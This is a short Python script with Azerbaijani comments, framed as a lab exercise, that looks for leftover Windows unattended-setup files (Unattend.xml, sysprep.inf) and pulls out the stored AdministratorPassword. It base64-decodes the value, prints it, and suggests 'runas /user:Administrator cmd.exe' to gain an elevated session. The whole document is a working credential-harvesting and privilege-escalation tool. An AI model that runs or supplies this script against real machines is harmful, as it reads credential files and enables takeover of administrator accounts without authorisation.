import os
import re
import base64

# 1. Geniş yayılmış qovluqlar və hədəf fayl adları
# Laboratoriya mühitində bu faylların yerləşə biləcəyi tipik yollar:
possible_paths = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\System32\Sysprep\unattend.xml",
    r"C:\Windows\System32\Sysprep\sysprep.inf",
    r"C:\unattend.txt",
    r"C:\sysprep.inf"
]

# 2. Şifrəni çıxarmaq üçün tələb olunan Regex şablonu
# XML daxilindəki <Value> teqləri arasındakı mətni hədəfləyir
password_regex = re.compile(r'<AdministratorPassword>.*?<Value>(.*?)</Value>', re.DOTALL)

def scan_and_extract():
    print("[*] Laboratoriya mühitində 'unattend' faylları skan edilir...")
    
    for path in possible_paths:
        if os.path.exists(path):
            print(f"[+] Fayl tapıldı: {path}")
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as file:
                    content = file.read()
                    
                    # Regex ilə şifrə blokunun axtarılması
                    match = password_regex.search(content)
                    if match:
                        encoded_password = match.group(1)
                        print(f"[+] Tapılan şifrə bloku (Kodlaşdırılmış): {encoded_password}")
                        
                        # 3. Kodun açılması (Decoding)
                        # Windows çox vaxt bu şifrələri Base64 formatında saxlayır
                        try:
                            decoded_bytes = base64.b64decode(encoded_password)
                            decoded_password = decoded_bytes.decode("utf-8")
                            print(f"[==>] DEŞİFRƏ OLUNMUŞ ADMİN ŞİFRƏSİ: {decoded_password}")
                            return decoded_password
                        except Exception as e:
                            print(f"[-] Base64 deşifrə xətası (Ola bilsin şifrə açıq mətndir): {e}")
                            print(f"[==>] EHTİMAL OLUNAN ŞİFRƏ: {encoded_password}")
                            return encoded_password
            except Exception as e:
                print(f"[-] Fayl oxunarkən xəta baş verdi ({path}): {e}")
    
    print("[-] Hədəf fayllarda hər hansı bir AdministratorPassword strukturu tapılmadı.")
    return None

if __name__ == "__main__":
    admin_pass = scan_and_extract()
    if admin_pass:
        print("\n[!] Növbəti addım:")
        print(f"Sessiyanı yüksəltmək üçün terminalda əllə icra edin:")
        print(f"runas /user:Administrator cmd.exe")
